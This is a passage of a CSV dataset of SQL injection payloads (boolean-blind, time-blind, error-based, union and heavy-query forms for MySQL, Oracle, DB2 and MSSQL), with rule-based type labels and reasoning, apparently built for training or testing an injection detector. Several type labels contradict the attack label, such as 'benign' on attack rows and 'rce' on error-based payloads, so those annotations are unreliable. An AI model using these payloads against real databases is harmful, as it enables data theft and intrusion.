row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
11220,"1"" ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( ""asvy"" = ""asvy",1,,boolean_blind,generic,0.95,") and (, rlike  detected — boolean_blind injection (priority 8) on generic",rule-based
11221,"1"" ) ) )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
11222,"-6760 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) # ikqw",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
11223,"1',iif ( 6625 = 6625,1,1/0 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
11224,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 'jloi' = 'jloi",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
11225,"1"" ) ) as hace where 8785 = 8785",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
11226,1%' ) and 8734 = 5844,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
11227,1 rlike sleep ( 5 ),1,,time_blind,mysql,0.85,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
11228,"1"" ) as jmwr where 5978 = 5978 rlike ( select ( case when ( 1396 = 8762 ) then 1 else 0x28 end ) ) --",1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
11229,"-9133"" ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""crfy"" = ""crfy",1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
11230,1'+ ( select ntym where 4750 = 4750,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
11231,"1"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""jgoq"" = ""jgoq",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
11232,"1' where 9116 = 9116 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,9116 = 9116 and detected — boolean_blind injection (priority 8) on generic,rule-based
11233,-5089' ) ) as icbb where 1129 = 1129 or 6250 = 9650,1,,boolean_blind,generic,0.95,1129 = 1129 or detected — boolean_blind injection (priority 8) on generic,rule-based
11234,"-5703' ) or elt ( 2972 = 8708,8708 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
11235,"-6851' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'csfx' = 'csfx",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
11236,"1"" ) where 8153 = 8153",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
11237,1' ) ) ) and sleep ( 5 ) and ( ( ( 'vbck' like 'vbck,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
11238,1 ) where 2918 = 2918 and 7533 = 7533--,1,,boolean_blind,generic,0.95,2918 = 2918 and detected — boolean_blind injection (priority 8) on generic,rule-based
11239,"-8609%"" ) ) ) union all select 6021,6021,6021,6021,6021,6021--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
11240,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 'fegp' = 'fegp",1,,rce,generic,0.95,0x4c4d6142 detected — rce injection (priority 1) on generic,rule-based
11241,"1%"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""%"" = """,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
11242,"1"" ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""fpqh"" = ""fpqh",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
11243,"1 ) ) as rwsn where 9946 = 9946 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
11244,"1'+ ( select wjpc where 5943 = 5943 and make_set ( 8403 = 8403,8899 ) ) +'",1,,boolean_blind,generic,0.95,5943 = 5943 and detected — boolean_blind injection (priority 8) on generic,rule-based
11245,"1%' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( '%' = '",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
11246,-9456%' ) ) ) order by 1#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
11247,99745017c,0,,unknown,unknown,0.5,Insufficient information to classify,rule-based
11248,ejerci78,0,,unknown,unknown,0.5,Insufficient information to classify,rule-based
11249,"calle valencia de don juan 161, 7?d",0,,benign,generic,0.8,No attack signals detected in payload,rule-based
